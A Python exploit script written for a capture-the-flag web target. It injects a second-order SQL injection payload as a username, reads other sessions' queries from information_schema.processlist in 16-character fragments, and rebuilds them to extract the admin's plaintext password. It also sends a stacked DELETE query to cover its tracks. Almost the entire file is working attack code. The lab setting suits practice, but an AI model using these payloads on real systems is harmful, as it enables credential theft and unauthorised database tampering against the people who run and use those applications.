#!/usr/bin/env python3

import requests
import re
import time
import sys
from bs4 import BeautifulSoup # Added for HTML parsing to extract fragments

# --- Configuration ---
# IMPORTANT: Set the base URL of your CTF target directly here.
# This should be the URL of the registration page, e.g., "http://10.10.39.45/register.php"
# The script will infer the "last logins" page by assuming it's the base URL without the file name.
url_base_register = "http://10.10.39.45/register.php" # <--- CHANGE THIS TO YOUR ACTUAL CTF REGISTRATION URL
# Derive the "last logins" page URL. This assumes it's the directory containing register.php.
# For example, if register.php is at http://example.com/register.php, the last logins page is http://example.com/
url_base_last_logins = url_base_register.rsplit('/', 1)[0] + '/' 

# The SQL injection payload to be used as a username.
# This payload directly selects fragmented info from information_schema.processlist.
# It's split across multiple UNION ALL selects to bypass 16-character truncation.
SQL_PAYLOAD = """0" union all select null,mid(info,1,16) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,17,32) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,33,48) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,49,64) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,65,80) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,81,96) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,97,112) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,113,128) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,129,144) from information_schema.processlist where info not like '%info%'-- -"""

# --- Function to Reconstruct SQL Query from Fragments ---
def reconstruct_sql_query_from_fragments(fragmented_lines):
    """
    Reconstructs a full SQL query from a list of fragmented lines,
    based on the expected structure of the admin login query from the CTF.

    Args:
        fragmented_lines (list of str): A list of strings, where each string
                                         is a fragmented piece of the SQL query.

    Returns:
        str: The reconstructed full SQL query, or an empty string if not found.
    """
    full_query = ""
    found_query_start = False

    # Iterate through the fragmented lines
    for line in fragmented_lines:
        # Heuristic to identify if it's the beginning of the admin's query
        # This matches the logic used in the original CTF writeup output.
        if line.startswith("SELECT * from us") or \
           line.startswith("ers where (usern") or \
           line.startswith("ame= 'admin' and") or \
           line.startswith(" password=md5('"):
            full_query += line
            found_query_start = True
        elif found_query_start:
            # If we've found the start, continue appending subsequent lines
            full_query += line
        # You might add an 'else' here if you want to handle lines that
        # are not part of the target query, e.g., for debugging.

    return full_query

# --- Helper function for robust requests with retries ---
def make_request_with_retries(session, method, url, max_retries=5, initial_delay=1, **kwargs):
    """
    Makes an HTTP request with retry logic for connection errors and timeouts.

    Args:
        session (requests.Session): The requests session object.
        method (str): The HTTP method ('GET' or 'POST').
        url (str): The URL for the request.
        max_retries (int): Maximum number of retries.
        initial_delay (int): Initial delay in seconds before the first retry.
        **kwargs: Additional arguments to pass to requests.request (e.g., data, timeout).

    Returns:
        requests.Response or None: The response object if successful, None otherwise.
    """
    for attempt in range(max_retries):
        try:
            print(f"   Attempt {attempt + 1}/{max_retries} for {method} {url}")
            response = session.request(method, url, timeout=10, **kwargs) # Added timeout
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            delay = initial_delay * (2 ** attempt) # Exponential backoff
            print(f"   Connection error or timeout: {e}. Retrying in {delay} seconds...")
            time.sleep(delay)
        except requests.exceptions.HTTPError as e:
            print(f"   HTTP Error: {e.response.status_code} - {e.response.text}. Not retrying for HTTP errors.")
            return None # Don't retry for explicit HTTP errors unless specified
        except Exception as e:
            print(f"   An unexpected error occurred during request: {e}. Not retrying.")
            return None
    print(f"   Failed to complete request to {url} after {max_retries} attempts.")
    return None


# --- Main Exploit Logic ---

print(f"--- Starting Advanced SQL Injection Exploit ---")
print(f"  Registration URL: {url_base_register}")
print(f"  Last Logins URL: {url_base_last_logins}")

# Initialize a session to maintain cookies
s = requests.Session()

try:
    # Step 1: Register a user with the SQL payload as the username.
    # This payload relies on being reflected on the "Last logins" page.
    print("\n[STEP 1] Registering user with SQL payload as username...")
    register_response = make_request_with_retries(s, 'POST', url_base_register, data={"username": SQL_PAYLOAD, "password": "mosec0", "submit": "Submit Query"})
    if not register_response:
        print("Exiting: Failed to register user with payload.")
        sys.exit(1)

    # Also log in with the new user to ensure it's active and its entry is created/updated.
    login_response = make_request_with_retries(s, 'POST', url_base_register.replace("register.php", "login.php"), data={"username": SQL_PAYLOAD, "password": "mosec0", "login": "Submit Query"})
    if not login_response:
        print("Exiting: Failed to log in with injected user.")
        sys.exit(1)
        
    print("   Payload injected as username. Waiting for admin activity...")

    # Step 2: Continuously fetch the "Last logins" page to extract data.
    # This loop waits for the admin's periodic login, which will then be
    # captured by the injected payload in information_schema.processlist.
    print("\n[STEP 2] Continuously fetching 'Last logins' page to extract data...")
    start_time = time.time()
    timeout = 180 # Max 3 minutes to wait for admin login and extraction
    found_password = False

    while time.time() - start_time < timeout and not found_password:
        r = make_request_with_retries(s, 'GET', url_base_last_logins) # Fetch the "Last logins" content
        if not r:
            print("   Failed to retrieve 'Last logins' page. Retrying...")
            time.sleep(5) # Add a small delay before next attempt if request failed
            continue
        
        # Check if the page contains a header indicating a user with our payload
        # This is where the output will be reflected.
        # Example: <th>User 5 - 0" union all select null,mid(info,1,16) ... last logins</th>
        # We'll search for a unique part of our payload to identify our entry.
        payload_identifier = SQL_PAYLOAD[:50] # Use the first 50 chars as a unique identifier
        
        if payload_identifier in r.text:
            print(f"   Injected payload username detected on page. Current time: {time.strftime('%H:%M:%S')}")
            
            soup = BeautifulSoup(r.text, 'html.parser')
            extracted_fragments = []

            # Find the <th> tag that contains our injected username payload
            # This is the header for the table displaying our payload's results.
            target_th = None
            for th_tag in soup.find_all('th'):
                if payload_identifier in th_tag.get_text():
                    target_th = th_tag
                    break
            
            if target_th:
                # Assuming the fragments are in <td> tags within the same <tbody> or a sibling <tbody>
                # Find the parent table or tbody
                parent_table = target_th.find_parent('table')
                if parent_table:
                    # Iterate through all <td> tags within this table's tbody
                    # or directly following the <th>'s parent row
                    for td_tag in parent_table.find_all('td'):
                        text = td_tag.get_text(strip=True)
                        # Filter out dates and simple user IDs, focus on potential query fragments
                        # This filter is more general as we're looking for the *output* of our query
                        if not re.match(r'^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$', text) and \
                           not re.match(r'^User \d+ - .* last logins$', text) and \
                           text != "Logout" and \
                           payload_identifier not in text: # Exclude the payload itself if it appears as data
                            extracted_fragments.append(text)
                else:
                    print("   Could not find parent table for injected username header.")

            if extracted_fragments:
                print("\n   --- Raw Extracted Fragments from Page ---")
                for frag in extracted_fragments:
                    print(f"   - {frag}")

                reconstructed_query = reconstruct_sql_query_from_fragments(extracted_fragments)

                if reconstructed_query:
                    print("\n   --- Reconstructed Admin Login Query ---")
                    print(reconstructed_query)

                    # Extract the password specifically from the reconstructed query:
                    password_start_marker = "password=md5('"
                    password_end_marker = "') ) UNION ALL SE" # Or just "')" if the query ends there

                    start_index = reconstructed_query.find(password_start_marker)
                    if start_index != -1:
                        password_start_index = start_index + len(password_start_marker)
                        end_index = reconstructed_query.find(password_end_marker, password_start_index)
                        
                        # If the exact UNION ALL SE is not found, try just closing quote
                        if end_index == -1:
                            password_end_marker_alt = "') )"
                            end_index = reconstructed_query.find(password_end_marker_alt, password_start_index)
                        
                        if end_index != -1:
                            plaintext_password = reconstructed_query[password_start_index:end_index]
                            print(f"\n   --- Extracted Plaintext Password ---")
                            print(f"   Password: {plaintext_password}")
                            found_password = True
                            break # Exit the while loop after finding password
                        else:
                            print("\n   Could not find the end of the password string in reconstructed query.")
                    else:
                        print("\n   Could not find the start of the password string (password=md5(') in reconstructed query.")
                else:
                    print("\n   No complete admin login query could be reconstructed from fragments.")
            else:
                print("\n   No potential SQL fragments found on the page yet for the injected user.")
        else:
            print(f"   Injected username not yet detected on page or no data. Waiting... ({int(time.time() - start_time)}s elapsed)")
        
        time.sleep(5) # Wait before checking again

    if not found_password:
        print("\nExploit timed out or failed to find the admin password.")
        print("Possible reasons: Admin bot not running, incorrect URLs, or unexpected page structure.")

    # Step 3: Clean up the database after successful extraction
    # Delete the user created with the SQL_PAYLOAD username.
    print("\n[STEP 3] Cleaning up the database...")
    # This cleanup payload will delete the user whose username contains parts of our payload.
    cleanup_payload = f'" UNION SELECT 1,2; DELETE FROM web.users WHERE username LIKE "%{SQL_PAYLOAD[:20]}%";#' # Use a shorter identifier for LIKE
    s.post(url_base_register, data={"username": cleanup_payload, "password": "mosec0", "submit": "Submit Query"})
    s.post(url_base_register.replace("register.php", "login.php"), data={"username": cleanup_payload, "password": "mosec0", "login": "Submit Query"})
    s.get(url_base_last_logins) # Ensure cleanup payload is processed
    print("   Database cleanup payload sent (attempted to delete injected user).")

except requests.exceptions.RequestException as e:
    print(f"\n[ERROR] A network error occurred: {e}")
    print("Please ensure the base URL is correct and the target is reachable.")
except Exception as e:
    print(f"\n[ERROR] An unexpected error occurred: {e}")

print("\n--- Exploit Script Finished ---")